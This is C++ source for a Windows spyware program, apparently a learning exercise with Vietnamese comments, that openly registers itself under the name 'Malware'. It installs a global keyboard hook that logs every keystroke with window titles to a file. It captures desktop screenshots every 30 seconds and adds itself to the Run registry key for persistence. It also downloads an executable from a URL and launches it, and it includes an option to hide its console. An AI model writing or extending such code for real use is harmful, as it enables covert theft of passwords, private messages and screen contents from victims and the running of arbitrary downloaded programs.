#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <time.h>
#include <iostream>
#include <time.h>
#include <map>
#include <string>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <GdiPlus.h>
#include <lmcons.h>
#include <vector>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "Wininet.lib")
#pragma comment (lib, "gdiplus.lib")

#define visible

#define FORMAT 0

#define mouseignore 

using namespace std;
using namespace Gdiplus;

fstream err("errormul.txt", ios::app);
fstream log_error_file("log_error.txt", ios::app);

DWORD WINAPI Downloader(LPVOID lpParam);
DWORD WINAPI KeyLogger(LPVOID lpParam);
DWORD WINAPI AutoScreenShot(LPVOID lpParam);
DWORD WINAPI AutoRun(LPVOID lpParam);

void Stealth() {
	// Tao 1 cua so moi

#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	FreeConsole();
#endif
}

#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			Save(kbdStruct.vkCode);
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

/*https://learn.microsoft.com/en-us/windows/win32/procthread/creating-threads*/

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	ofstream output_file;
	const char* output_filename = "keylogger.log";
	cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, ios_base::app);

	stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			struct tm tm_info;
			time_t t = time(NULL);
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		bool uppercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_LSHIFT) & 0x8000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x8000) != 0)
		{
			uppercase = !uppercase;
		}

		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		if (!uppercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	output_file << output.str();
	output_file.flush();

	cout << output.str();

	return 0;
}

void Executing(LPWSTR cmdLine) {
	// Tao mot Process chay file vua download = cach su dung ham CreateProcessW
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(NULL, cmdLine, NULL,
		NULL, FALSE, 0, NULL,
		NULL, &si, &pi);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

DWORD WINAPI Downloader(LPVOID lpParam)
{
	// Su dung API URLDownloadToFile de download file executeable (vi du la git)
	CreateDirectoryA("D:\\DownloadFile", NULL);
	string filePath = "D:\\DownloadFile\\git.exe"; //Phai nhap ten file FUCKKK
	string URL = "https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe";

	wstring tempUrl = wstring(URL.begin(), URL.end());
	wstring tempPath = wstring(filePath.begin(), filePath.end());

	LPCWSTR wideStringUrl = tempUrl.c_str();
	LPCWSTR wideStringPath = tempPath.c_str();

	if (S_OK == (URLDownloadToFile(NULL, wideStringUrl, wideStringPath, 0, NULL))) {
		cout << "Download: Successful!!!" << '\n';
		cout << "Start Executing....." << '\n';
		Executing(&tempPath[0]);
	}
	else {
		cout << "Download: Failed" << '\n';
	}
	return 0;
}

DWORD WINAPI AutoRun(LPVOID lpParam) {
	string exePath(200, '\0'); //Phai allocate truoc 1 khoang space cho no
	int code = GetModuleFileNameA(NULL, &exePath[0], 100);
	HKEY hKey;
	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	BYTE* exePathB = (BYTE*)exePath.c_str();
	if (lnRes == ERROR_SUCCESS) {
		cout << "Open Reg Successfully!" << '\n';
		lnRes = RegSetValueExA(hKey, "Malware", 0, REG_SZ, (BYTE*)exePathB, exePath.length());
		if (lnRes == ERROR_SUCCESS) cout << "Add Reg Successfully!" << '\n';
		else cout << "Add Failed!!!" << '\n';
	}
	else cout << "Open Failed!" << '\n';
	return 0;
}

void screenshot(string file) {
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput);

	HDC dc = GetDC(GetDesktopWindow());
	HDC dc2 = CreateCompatibleDC(dc);

	RECT rc0kno;  // rectangle  Object

	GetClientRect(GetDesktopWindow(), &rc0kno);
	int w = rc0kno.right - rc0kno.left;
	int h = rc0kno.bottom - rc0kno.top;

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	Bitmap* bm = new Bitmap(hbitmap, NULL);

	UINT num;
	UINT size;

	ImageCodecInfo* imagecodecinfo;
	GetImageEncodersSize(&num, &size);

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo);

	CLSID clsidEncoder;

	for (UINT i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid;
	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(), file.end());
	bm->Save(ws.c_str(), &clsidEncoder);
	SelectObject(dc2, holdbitmap);
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(), dc);
	GdiplusShutdown(gdiplustoken);
}

DWORD WINAPI AutoScreenShot(LPVOID lpParam) {
	while (true) {
		SYSTEMTIME st;
		GetLocalTime(&st);
		int year = st.wYear;
		int month = st.wMonth;
		int day = st.wDay;
		int hour = st.wHour;
		int mintue = st.wMinute;

		string yearS = to_string(year);
		yearS += "_";
		string monthS = to_string(month);
		monthS += "-";
		string dayS = to_string(day);
		dayS += "-";
		string hourS = to_string(hour);
		hourS += "H-";
		string mintueS = to_string(mintue);
		mintueS += "M.jpg";

		string startDate;
		startDate = dayS + monthS + yearS + hourS + mintueS;

		screenshot(startDate);
		Sleep(1000 * 30 * 1);
	}
	return 0;
}

DWORD WINAPI KeyLogger(LPVOID lpParam)
{

	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	return 0;
}

int main()
{
	Stealth();

	vector <HANDLE> threads;
	for (size_t i = 0; i < 4; ++i) {
		HANDLE hThread1 = CreateThread(NULL, 0, Downloader, NULL, 0, NULL);
		HANDLE hThread2 = CreateThread(NULL, 0, AutoRun, NULL, 0, NULL);
		HANDLE hThread3 = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
		HANDLE hThread4 = CreateThread(NULL, 0, AutoScreenShot, NULL, 0, NULL);

		threads.push_back(hThread1);
		threads.push_back(hThread2);
		threads.push_back(hThread3);
		threads.push_back(hThread4);
	}
	WaitForMultipleObjects(threads.size(), threads.data(), TRUE, INFINITE);

	for (int i = 0; i < 4; i++)
	{
		CloseHandle(threads[i]);
		if (threads[i] != NULL)
		{
			//HeapFree(GetProcessHeap(), 0, pDataArray[i]);
			threads[i] = NULL;    // Ensure address is not reused.
		}
	}

	return 0;
}
